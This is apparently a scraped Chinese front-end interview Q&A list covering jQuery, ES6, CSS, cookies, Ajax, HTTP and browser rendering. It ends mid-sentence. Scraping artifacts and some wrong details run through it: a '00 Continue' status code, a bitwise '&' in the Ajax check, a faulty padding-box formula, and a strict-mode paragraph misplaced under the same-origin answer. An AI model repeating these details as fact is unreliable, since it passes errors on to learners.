你觉得jQuery或zepto源码有哪些写的好的地方==jquery源码封装在一个匿名函数的自执行环境中，有助于防止变量的全局污染，然后通过传入window对象参数，可以使window对象作为局部变量使用，好处是当jquery中访问window对象的时候，就不用将作用域链退回到顶层作用域了，从而可以更快的访问window对象。同样，传入undefined参数，可以缩短查找undefined时的作用域链。 1234567(function( window, undefined ) &#123; //用一个函数域包起来，就是所谓的沙箱 //在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局 //把当前沙箱需要的外部变量通过函数参数引入进来 //只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数 window.jQuery = window.$ = jQuery;&#125;)( window ); jquery将一些原型属性和方法封装在了jquery.prototype中，为了缩短名称，又赋值给了jquery.fn，这是很形象的写法。 有一些数组或对象的方法经常能使用到，jQuery将其保存为局部变量以提高访问速度。 jquery实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率。 ==24. ES6的了解==新增模板字符串（为JavaScript提供了简单的字符串插值功能）、箭头函数（操作符左边为输入的参数，而右边则是进行的操作以及返回的值Inputs=&gt;outputs。）、for-of（用来遍历数据—例如数组中的值。）arguments对象可被不定参数和默认参数完美代替。ES6将promise对象纳入规范，提供了原生的Promise对象。增加了let和const命令，用来声明变量。增加了块级作用域。let命令实际上就增加了块级作用域。ES6规定，var命令和function命令声明的全局变量，属于全局对象的属性；let命令、const命令、class命令声明的全局变量，不属于全局对象的属性。还有就是引入module模块的概念。 ==25. js继承方式及其优缺点==原型链继承的缺点 一是字面量重写原型会中断关系，使用引用类型的原型，并且子类型还无法给超类型传递参数。 借用构造函数（类式继承） 借用构造函数虽然解决了刚才两种问题，但没有原型，则复用无从谈起。所以我们需要原型链+借用构造函数的模式，这种模式称为组合继承 组合式继承 组合式继承是比较常用的一种继承方法，其背后的思路是 使用原型链实现对原型属性和方法的继承，而通过借用构造函数来实现对实例属性的继承。这样，既通过在原型上定义方法实现了函数复用，又保证每个实例都有它自己的属性。 ==26. 关于Http 2.0 你知道多少？==HTTP/2引入了“服务端推（server push）”的概念，它允许服务端在客户端需要数据之前就主动地将数据发送到客户端缓存中，从而提高性能。 HTTP/2提供更多的加密支持 HTTP/2使用多路技术，允许多个消息在一个连接上同时交差。 它增加了头压缩（header compression），因此即使非常小的请求，其请求和响应的header都只会占用很小比例的带宽。 ==27. defer和async== defer并行加载js文件，会按照页面上script标签的顺序执行 async并行加载js文件，下载完成立即执行，不会按照页面上script标签的顺序执行 ==28. 谈谈浮动和清除浮动==浮动的框可以向左或向右移动，直到他的外边缘碰到包含框或另一个浮动框的边框为止。由于浮动框不在文档的普通流中，所以文档的普通流的块框表现得就像浮动框不存在一样。浮动的块框会漂浮在文档普通流的块框上。 ==29. 如何评价AngularJS和BackboneJS==backbone具有依赖性，依赖underscore.js。Backbone + Underscore + jQuery(or Zepto) 就比一个AngularJS 多出了2 次HTTP请求. Backbone的Model没有与UI视图数据绑定，而是需要在View中自行操作DOM来更新或读取UI数据。AngularJS与此相反，Model直接与UI视图绑定，Model与UI视图的关系，通过directive封装，AngularJS内置的通用directive，就能实现大部分操作了，也就是说，基本不必关心Model与UI视图的关系，直接操作Model就行了，UI视图自动更新。 AngularJS的directive，你输入特定数据，他就能输出相应UI视图。是一个比较完善的前端MVW框架，包含模板，数据双向绑定，路由，模块化，服务，依赖注入等所有功能，模板功能强大丰富，并且是声明式的，自带了丰富的 Angular 指令。 ==30. 用过哪些设计模式？==工厂模式：主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字。将所有实例化的代码集中在一个位置防止代码重复。 工厂模式解决了重复实例化的问题 ，但还有一个问题,那就是识别问题，因为根本无法 搞清楚他们到底是哪个对象的实例。 12345678910function createObject(name,age,profession)&#123;//集中实例化的函数var obj = new Object(); obj.name = name; obj.age = age; obj.profession = profession; obj.move = function () &#123; return this.name + &apos; at &apos; + this.age + &apos; engaged in &apos; + this.profession; &#125;; return obj;&#125;var test1 = createObject(&apos;trigkit4&apos;,22,&apos;programmer&apos;);//第一个实例var test2 = createObject(&apos;mike&apos;,25,&apos;engineer&apos;);//第二个实例 构造函数模式使用构造函数的方法 ，即解决了重复实例化的问题 ，又解决了对象识别的问题，该模式与工厂模式的不同之处在于： 构造函数方法没有显示的创建对象 (new Object()); 直接将属性和方法赋值给 this 对象; 没有 renturn 语句。 ==31. 说说你对闭包的理解==使用闭包主要是为了设计私有的方法和变量。闭包的优点是可以避免全局变量的污染，缺点是闭包会常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。在js中，函数即闭包，只有函数才会产生作用域的概念 闭包有三个特性： 函数嵌套函数 函数内部可以引用外部的参数和变量 参数和变量不会被垃圾回收机制回收 ==32. 请你谈谈Cookie的弊端==cookie虽然在持久保存客户端数据提供了方便，分担了服务器存储的负担，但还是有很多局限性的。 第一：每个特定的域名下最多生成20个cookie IE6或更低版本最多20个cookie IE7和之后的版本最后可以有50个cookie。 Firefox最多50个cookie chrome和Safari没有做硬性限制 IE和Opera 会清理近期最少使用的cookie，Firefox会随机清理cookie。cookie的最大大约为4096字节，为了兼容性，一般不能超过4095字节。 IE 提供了一种存储可以持久化用户数据，叫做userdata，从IE5.0就开始支持。每个数据最多128K，每个域名下最多1M。这个持久化数据放在缓存中，如果缓存没有清理，那么会一直存在 优点：极高的扩展性和可用性 通过良好的编程，控制保存在cookie中的session对象的大小。 通过加密和安全传输技术（SSL），减少cookie被破解的可能性。 只在cookie中存放不敏感数据，即使被盗也不会有重大损失。 控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。 缺点： Cookie数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉. 安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。 有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。 ==33. web storage和cookie的区别==Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。 除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。 但是cookie也是不可以或缺的：cookie的作用是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生 浏览器的支持除了IE７及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的userData其实就是javascript本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持web storage。 localStorage和sessionStorage都具有相同的操作方法，例如setItem、getItem和removeItem等 ==34. cookie 和 session 的区别：== cookie数据存放在客户的浏览器上，session数据放在服务器上。 cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗 考虑到安全应当使用session。 session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能 考虑到减轻服务器性能方面，应当使用COOKIE。 单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。 所以个人建议： 将登陆信息等重要信息存放为SESSION 其他信息如果需要保留，可以放在COOKIE中 ==35. display:none和visibility:hidden的区别？== display:none 隐藏对应的元素，在文档布局中不再给它分配空间，它各边的元素会合拢，就当他从来不存在。 visibility:hidden 隐藏对应的元素，但是在文档布局中仍保留原来的空间。 ==36. position:absolute和float属性的异同== 共同点：对内联元素设置float和absolute属性，可以让元素脱离文档流，并且可以设置其宽高。 不同点：float仍会占据位置，absolute会覆盖文档流中的其他元素。 ==37. 介绍一下box-sizing属性？==box-sizing属性主要用来控制元素的盒模型的解析模式。默认值是content-box。 content-box：让元素维持W3C的标准盒模型。元素的宽度/高度由border + padding + content的宽度/高度决定，设置width/height属性指的是content部分的宽/高 border-box：让元素维持IE传统盒模型（IE6以下版本和IE6~7的怪异模式）。设置width/height属性指的是border + padding + content 标准浏览器下，按照W3C规范对盒模型解析，一旦修改了元素的边框或内距，就会影响元素的盒子尺寸，就不得不重新计算元素的盒子尺寸，从而影响整个页面的布局。 ==38. CSS3新增伪类举例：== p:first-of-type 选择属于其父元素的首个 元素的每个 元素。 p:last-of-type 选择属于其父元素的最后 元素的每个 元素。 p:only-of-type 选择属于其父元素唯一的 元素的每个 元素。 p:only-child 选择属于其父元素的唯一子元素的每个 元素。 p:nth-child(2) 选择属于其父元素的第二个子元素的每个 元素。 :enabled :disabled 控制表单控件的禁用状态。 :checked 单选框或复选框被选中。 ==39. CSS3有哪些新特性？== CSS3实现圆角（border-radius），阴影（box-shadow）， 对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform） transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);//旋转,缩放,定位,倾斜 增加了更多的CSS选择器 多背景 rgba 在CSS3中唯一引入的伪元素是::selection. 媒体查询，多栏布局 border-image CSS3中新增了一种盒模型计算方式：box-sizing。盒模型默认的值是content-box, 新增的值是padding-box和border-box，几种盒模型计算元素宽高的区别如下： content-box（默认） 布局所占宽度Width：Width = width + padding-left + padding-right + border-left + border-right 布局所占高度Height:Height = height + padding-top + padding-bottom + border-top + border-bottom padding-box 布局所占宽度Width：Width = width(包含padding-left + padding-right) + border-top + border-bottom 布局所占高度Height:height(包含padding-top + padding-bottom) + border-top + border-bottom border-box 布局所占宽度Width：Width = width(包含padding-left + padding-right + border-left + border-right) 布局所占高度Height: Height = height(包含padding-top + padding-bottom + border-top + border-bottom) ==40. HTML与XHTML——二者有什么区别==区别： 所有的标记都必须要有一个相应的结束标记 所有标签的元素和属性的名字都必须使用小写 所有的XML标记都必须合理嵌套 所有的属性必须用引号””括起来 把所有&lt;和&amp;特殊符号用编码表示 给所有属性赋一个值 不要在注释内容中使“–” 图片必须有说明文字 ==41. 常见兼容性问题？==png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8.也可以引用一段脚本处理. 浏览器默认的margin和padding不同。解决方案是加一个全局的*{margin:0;padding:0;}来统一。 IE6双边距bug:块属性标签float后，又有横行的margin情况下，在ie6显示margin比设置的大。 浮动ie产生的双倍距离（IE6双边距问题：在IE6下，如果对元素设置了浮动，同时又设置了margin-left或margin-right，margin值会加倍。） #box{ float:left; width:10px; margin:0 0 0 100px;} 这种情况之下IE会产生20px的距离，解决方案是在float的标签样式控制中加入display:inline;将其转化为行内属性。(这个符号只有ie6会识别) 渐进识别的方式，从总体中逐渐排除局部。 首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。 接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。 1234567891011.bb&#123; background-color:#f1ee18;/*所有识别*/ .background-color:#00deff\9; /*IE6、7、8识别*/ +background-color:#a200ff;/*IE6、7识别*/ _background-color:#1e0bd1;/*IE6识别*/ &#125; 异模式问题：漏写DTD声明，Firefox仍然会按照标准模式来解析网页，但在IE中会触发怪异模式。为避免怪异模式给我们带来不必要的麻烦，最好养成书写DTD声明的好习惯。现在可以使用html5推荐的写法：&lt;doctype html&gt; ==42. 解释下浮动和它的工作原理？清除浮动的技巧==浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。 1.使用空标签清除浮动。 这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。 2.使用overflow。 给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。 3.使用after伪对象清除浮动。 该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素； ==43. html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？==HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。 拖拽释放(Drag and drop) API 语义化更好的内容标签（header,nav,footer,aside,article,section） 音频、视频API(audio,video) 画布(Canvas) API 地理(Geolocation) API 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失； sessionStorage 的数据在浏览器关闭后自动删除 表单控件，calendar、date、time、email、url、search 新的技术webworker, websocket, Geolocation 移除的元素 纯表现的元素：basefont，big，center，font, s，strike，tt，u； 对可用性产生负面影响的元素：frame，frameset，noframes； ==44. 什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？==FOUC - Flash Of Unstyled Content 文档样式闪烁 12345678910111213141516171819202122232425262728293031323334 &lt;style type="text/css" media="all"&gt;@import "../fouc.css";&lt;/style&gt;``` 而引用CSS文件的@import就是造成这个问题的罪魁祸首。IE会先加载整个HTML文档的DOM，然后再去导入外部的CSS文件，因此，在页面DOM加载完成到CSS导入完成中间会有一段时间页面上的内容是没有样式的，这段时间的长短跟网速，电脑速度都有关系。 解决方法简单的出奇，只要在&lt;head&gt;之间加入一个&lt;link&gt;或者&lt;script&gt;元素就可以了。 ## ==45. null和undefined的区别？==null是一个表示”无”的对象，转为数值时为0；undefined是一个表示”无”的原始值，转为数值时为NaN。当声明的变量还未被初始化时，变量的默认值为undefined。- null用来表示尚未存在的对象，常用来表示函数企图返回一个不存在的对象。- undefined表示”缺少值”，就是此处应该有一个值，但是还没有定义。典型用法是：1. 变量被声明了，但没有赋值时，就等于undefined。1. 调用函数时，应该提供的参数没有提供，该参数等于undefined。1. 对象没有赋值的属性，该属性的值为undefined。1. 函数没有返回值时，默认返回undefined。null表示”没有对象”，即该处不应该有值。典型用法是：1. 作为函数的参数，表示该函数的参数不是对象。1. 作为对象原型链的终点。## ==46. new操作符具体干了什么呢?==1. 创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。2. 属性和方法被加入到 this 引用的对象中。3. 新创建的对象由 this 所引用，并且最后隐式的返回 this 。```jsvar obj = &#123;&#125;;obj.__proto__ = Base.prototype;Base.call(obj); ==47. js延迟加载的方式有哪些？==defer和async、动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）、按需异步载入js ==48. 哪些操作会造成内存泄漏？==内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。 闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环） ==49. 列举IE 与其他浏览器不一样的特性？== IE支持currentStyle，FIrefox使用getComputStyle IE 使用innerText，Firefox使用textContent 滤镜方面：IE:filter:alpha(opacity= num)；Firefox：-moz-opacity:num 事件方面：IE：attachEvent：火狐是addEventListener 鼠标位置：IE是event.clientX；火狐是event.pageX IE使用event.srcElement；Firefox使用event.target IE中消除list的原点仅需margin:0即可达到最终效果；FIrefox需要设置margin:0;padding:0以及list-style:none CSS圆角：ie7以下不支持圆角 ==50. WEB应用从服务器主动推送Data到客户端有那些方式？==Javascript数据推送 Commet：基于HTTP长连接的服务器推送技术 基于WebSocket的推送方案 SSE（Server-Send Event）：服务器推送数据新方式 ==51. 对前端界面工程师这个职位是怎么样理解的？它的前景会怎么样？==前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。 1、实现界面交互 2、提升用户体验 3、有了Node.js，前端可以实现服务端的一些事情 前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好，参与项目，快速高质量完成实现效果图，精确到1px； 与团队成员，UI设计，产品经理的沟通； 做好的页面结构，页面重构和用户体验； 处理hack，兼容、写出优美的代码格式； 针对服务器的优化、拥抱最新前端技术。 ==52. 一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？==分为4个步骤： （1） 当发送一个URL请求时，不管这个URL是Web页面的URL还是Web页面上每个资源的URL，浏览器都会开启一个线程来处理这个请求，同时在远程DNS服务器上启动一个DNS查询。这能使浏览器获得请求对应的IP地址。 （2） 浏览器与远程`Web`服务器通过`TCP`三次握手协商来建立一个`TCP/IP`连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。 （3） 一旦`TCP/IP`连接建立，浏览器会通过该连接向远程服务器发送`HTTP`的`GET`请求。远程服务器找到资源并使用HTTP响应返回该资源，值为200的HTTP响应状态表示一个正确的响应。 （4） 此时，`Web`服务器提供资源服务，客户端开始下载资源。 请求返回后，便进入了我们关注的前端模块 简单来说，浏览器会解析HTML生成DOM Tree，其次会根据CSS生成CSS Rule Tree，而javascript又可以根据DOM API操作DOM ==53. javascript对象的几种创建方式== 工厂模式 构造函数模式 原型模式 混合构造函数和原型模式 动态原型模式 寄生构造函数模式 稳妥构造函数模式 ==54. javascript继承的6种方法== 原型链继承 借用构造函数继承 组合继承(原型+借用构造) 原型式继承 寄生式继承 寄生组合式继承 ==55. 创建ajax的过程== 创建XMLHttpRequest对象,也就是创建一个异步调用对象. 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. 设置响应HTTP请求状态变化的函数. 发送HTTP请求. 获取异步调用返回的数据. 使用JavaScript和DOM实现局部刷新. 1234567var xmlHttp = new XMLHttpRequest();xmlHttp.open('GET','demo.php','true');xmlHttp.send()xmlHttp.onreadystatechange = function()&#123; if(xmlHttp.readyState === 4 &amp; xmlHttp.status === 200)&#123; &#125;&#125; ==56. 异步加载和延迟加载== 异步加载的方案： 动态插入script标签 通过ajax去获取js代码，然后通过eval执行 script标签上添加defer或者async属性 创建并插入iframe，让它异步执行js 延迟加载：有些 js 代码并不是页面初始化的时候就立刻需要的，而稍后的某些情况才需要的 ==57. ie各版本和chrome可以并行下载多少个资源==IE6 两个并发，iE7升级之后的6个并发，之后版本也是6个Firefox，chrome也是6个 ==58. Flash、Ajax各自的优缺点，在使用中如何取舍？== Flash适合处理多媒体、矢量图形、访问机器；对CSS、处理文本上不足，不容易被搜索。 Ajax对CSS、文本支持很好，支持搜索；多媒体、矢量图形、机器访问不足。 共同点：与服务器的无刷新传递消息、用户离线和在线状态、操作DOM ==59. 请解释一下 JavaScript 的同源策略。为什么要有同源限制？==概念:同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议。指一段脚本只能读取来自同一来源的窗口和文档的属性。 我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。缺点：现在网站的JS 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 merge 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节。 ==60. 事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？== 我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为。 事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件。； ev.stopPropagation();注意旧ie的方法 ev.cancelBubble = true; ==61. ajax的缺点和在IE下的问题？==ajax的缺点 ajax不支持浏览器back按钮。 安全问题 AJAX暴露了与服务器交互的细节。 对搜索引擎的支持比较弱。 破坏了程序的异常机制。 不容易调试。 IE缓存问题在IE浏览器下，如果请求的方法是GET，并且请求的URL不变，那么这个请求的结果就会被缓存。解决这个问题的办法可以通过实时改变请求的URL，只要URL改变，就不会被缓存，可以通过在URL末尾添加上随机的时间戳参数(‘t’= + new Date().getTime())或者： 1open(&apos;GET&apos;,&apos;demo.php?rand=+Math.random()&apos;,true);// Ajax请求的页面历史记录状态问题可以通过锚点来记录状态，location.hash。让浏览器记录Ajax请求时页面状态的变化。还可以通过HTML5的history.pushState，来实现浏览器地址栏的无刷新改变 ==62. 谈谈你对重构的理解==网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化，在扩展的同时保持一致的UI。 对于传统的网站来说重构通常是： 表格(table)布局改为DIV+CSS 使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对IE6有效的) 对于移动平台的优化 针对于SEO进行优化 深层次的网站重构应该考虑的方面 减少代码间的耦合 让代码保持弹性 严格按规范编写代码 设计可扩展的API 代替旧有的框架、语言(如VB) 增强用户体验 通常来说对于速度的优化也包含在重构中 压缩JS、CSS、image等前端资源(通常是由服务器来解决) 程序的性能优化(如数据读写) 采用CDN来加速资源加载 对于JS DOM的优化 HTTP服务器的文件缓存 ==63. HTTP状态码== 00 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息 200 OK 正常返回信息 201 Created 请求成功并且服务器创建了新的资源 202 Accepted 服务器已接受请求，但尚未处理 301 Moved Permanently 请求的网页已永久移动到新位置。 302 Found 临时性重定向。 303 See Other 临时性重定向，且总是使用 GET 请求新的 URI。 304 Not Modified 自从上次请求后，请求的网页未修改过。 400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。 401 Unauthorized 请求未授权。 403 Forbidden 禁止访问。 404 Not Found 找不到如何与 URI 相匹配的资源。 500 Internal Server Error 最常见的服务器端错误。 503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。 ==64. 说说你对Promise的理解==依照 Promise/A+ 的定义，Promise 有四种状态： pending: 初始状态, 非 fulfilled 或 rejected. fulfilled: 成功的操作. rejected: 失败的操作. settled: Promise已被fulfilled或rejected，且不是pending 另外， fulfilled 与 rejected 一起合称 settled。Promise 对象用来进行延迟(deferred) 和异步(asynchronous ) 计算。 Promise 的构造函数构造一个 Promise，最基本的用法如下 1234567var promise = new Promise(function(resolve, reject) &#123; if (...) &#123; // succeed resolve(result); &#125; else &#123; // fails reject(Error(errMessage)); &#125;&#125;); Promise 实例拥有 then 方法（具有 then 方法的对象，通常被称为 thenable）。它的使用方法如下: 1promise.then(onFulfilled, onRejected) 接收两个函数作为参数，一个在 fulfilled 的时候被调用，一个在 rejected 的时候被调用，接收参数就是 future，onFulfilled 对应 resolve, onRejected 对应 reject。 ==65. 说说你对前端架构师的理解== 负责前端团队的管理及与其他团队的协调工作，提升团队成员能力和整体效率； 带领团队完成研发工具及平台前端部分的设计、研发和维护； 带领团队进行前端领域前沿技术研究及新技术调研，保证团队的技术领先 负责前端开发规范制定、功能模块化设计、公共组件搭建等工作，并组织培训。 ==66. 说说严格模式的限制== 变量必须声明后再使用 函数的参数不能有同名属性，否则报错 不能使用with语句 不能对只读属性赋值，否则报错 不能使用前缀0表示八进制数，否则报错 不能删除不可删除的属性，否则报错 不能删除变量delete prop，会报错，只能删除属性delete global[prop] eval不会在它的外层作用域引入变量 eval和arguments不能被重新赋值 arguments不会自动反映函数参数的变化 不能使用arguments.callee 不能使用arguments.caller 禁止this指向全局对象 不能使用fn.caller和fn.arguments获取函数调用的堆栈 增加了保留字（比如protected、static和interface）设立”严格模式”的目的，主要有以下几个： 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为; 消除代码运行的一些不安全之处，保证代码运行的安全； 提高编译器效率，增加运行速度； 为未来新版本的Javascript做好铺垫。注：经过测试IE6,7,8,9均不支持严格模式。 ==67. 如何删除一个cookie==1. 将时间设为当前时间往前一点。 12var date = new Date();date.setDate(date.getDate() - 1);//真正的删除 2.expires的设置 1document.cookie = 'user='+ encodeURIComponent('name') + ';expires = ' + new Date(0) ==68. ，和，标签== 标签和 标签一样，用于强调文本，但它强调的程度更强一些。 em 是 斜体强调标签，更强烈强调，表示内容的强调点。相当于html元素中的 …; &lt; b &gt; &lt; i &gt;是视觉要素，分别表示无意义的加粗，无意义的斜体。 em 和 strong 是表达要素(phrase elements)。 ==69. 说说你对AMD和Commonjs的理解==CommonJS是服务器端模块的规范，Node.js采用了这个规范。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的。 ==70. document.write()的用法== document.write()方法可以用在两个方面：页面载入过程中用实时脚本创建页面内容，以及用延时脚本创建本窗口或新窗口的内容。 document.write只能重绘整个页面。innerHTML可以重绘页面的一部分 ==71. 编写一个方法 求一个字符串的字节长度==假设：一个英文字符占用一个字节，一个中文字符占用两个字节 123456789function GetBytes(str)&#123; var len = str.length; var bytes = len; for(var i=0; i&lt;len; i++)&#123; if (str.charCodeAt(i) &gt; 255) bytes++; &#125; return bytes; &#125;alert(GetBytes("你好,as")); ==72. git fetch和git pull的区别== git pull：相当于是从远程获取最新版本并merge到本地 git fetch：相当于是从远程获取最新版本到本地，不会自动merge ==73. 说说你对MVC和MVVM的理解==MVC View 传送指令到 Controller Controller 完成业务逻辑后，要求 Model 改变状态 Model 将新的数据发送到 View，用户得到反馈 所有通信都是单向的。 MVVMAngular它采用双向绑定（data-binding）：View的变动，自动反映在 ViewModel，反之亦然。 组成部分Model、View、ViewModel View：UI界面 ViewModel：它是View的抽象，负责View与Model之间信息转换，将View的Command传送到Model； Model：数据访问层 ==74. 请解释什么是事件代理==事件代理（Event Delegation），又称之为事件委托。是 JavaScript 中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。使用事件代理的好处是可以提高性能。 ==75. attribute和property的区别是什么？==attribute是dom元素在文档中作为html标签拥有的属性；property就是dom元素在js中作为对象拥有的属性。 所以： 对于html的标准属性来说，attribute和property是同步的，是会自动更新的，但是对于自定义的属性来说，他们是不同步的， ==76. 说说网络分层里七层模型是哪七层== 应用层：应用层、表示层、会话层（从上往下）（HTTP、FTP、SMTP、DNS） 传输层（TCP和UDP） 网络层（IP） 物理和数据链路层（以太网） 每一层的作用如下： 物理层：通过媒介传输比特,确定机械及电气规范（比特Bit） 数据链路层：将比特组装成帧和点到点的传递（帧Frame） 网络层：负责数据包从源到宿的传递和网际互连（包PackeT） 传输层：提供端到端的可靠报文传递和错误恢复（段Segment） 会话层：建立、管理和终止会话（会话协议数据单元SPDU） 表示层：对数据进行翻译、加密和压缩（表示协议数据单元PPDU） 应用层：允许访问OSI环境的手段（应用协议数据单元APDU） 各种协议 ICMP协议： 因特网控制报文协议。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。 TFTP协议： 是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。 HTTP协议： 超文本传输协议，是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。 DHCP协议： 动态主机配置协议，是一种让系统得以连接到网络上，并获取所需要的配置参数手段。 ==77. 说说mongoDB和MySQL的区别== MySQL是传统的关系型数据库，MongoDB则是非关系型数据库 mongodb以BSON结构（二进制）进行存储，对海量数据存储有着很明显的优势。 对比传统关系型数据库,NoSQL有着非常显著的性能和扩展性优势，与关系型数据库相比，MongoDB的优点有： ①弱一致性（最终一致），更能保证用户的访问速度： ②文档结构的存储方式，能够更便捷的获取数据。 ==78. 讲讲304缓存的原理==服务器首先产生ETag，服务器可在稍后使用它来判断页面是否已经被修改。本质上，客户端通过将该记号传回服务器要求服务器验证其（客户端）缓存。 304是HTTP状态码，服务器用来标识这个文件没修改，不返回内容，浏览器在接收到个状态码后，会使用浏览器已缓存的文件 客户端请求一个页面（A）。 服务器返回页面A，并在给A加上一个ETag。 客户端展现该页面，并将页面连同ETag一起缓存。 客户再次请求页面A，并将上次请求时服务器返回的ETag一起传递给服务器。 服务器检查该ETag，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应304（未修改——Not Modified）和一个空的响应体。 ==79. CSS3动画和js动画各有什么优劣==根据Google Developer，Chromium项目里，渲染线程分为main thread和compositor thread。如果CSS动画只是改变transforms和opacity，这时整个CSS动画得以在compositor thread完成（而JS动画则会在main thread执行，然后触发compositor进行下一步操作）在JS执行一些昂贵的任务时，main thread繁忙，CSS动画由于使用了compositor thread可以保持流畅。 在主线程中，维护了一棵Layer树（LayerTreeHost），管理了TiledLayer，在compositor thread，维护了同样一颗LayerTreeHostImpl，管理了LayerImpl，这两棵树的内容是拷贝关系。因此可以彼此不干扰，当Javascript在main thread操作LayerTreeHost的同时，compositor thread可以用LayerTreeHostImpl做渲染。当Javascript繁忙导致主线程卡住时，合成到屏幕的过程也是流畅的。 为了实现防假死，鼠标键盘消息会被首先分发到compositor thread，然后再到main thread。这样，当main thread繁忙时，compositor thread还是能够响应一部分消息，例如，鼠标滚动时，加入main thread繁忙，compositor thread也会处理滚动消息，滚动已经被提交的页面部分（未被提交的部分将被刷白）。 CSS动画比JS流畅的前提： 在Chromium基础上的浏览器中 JS在执行一些昂贵的任务 同时CSS动画不触发layout或paint 在CSS动画或JS动画触发了paint或layout时，需要main thread进行Layer树的重计算，这时CSS动画或JS动画都会阻塞后续操作。 参考CSS Triggers，只有如下属性的修改才符合“仅触发Composite，不触发layout或paint”： backface-visibility opacity perspective perspective-origin transfrom 所以只有用上了3D加速或修改opacity时，才有机会用得上CSS动画的这一优势。 因此，在大部分应用场景下，效率角度更值得关注的还是下列问题。 是否导致layout repaint的面积 是否是有高消耗的属性（css shadow等） 是否启用硬件加速 那么Chromium以外的其他浏览器呢？CSSTrick里比较了一次效率。 Animated properties JS-based Animation更快 CSS-based Animation更快 top, left, width, 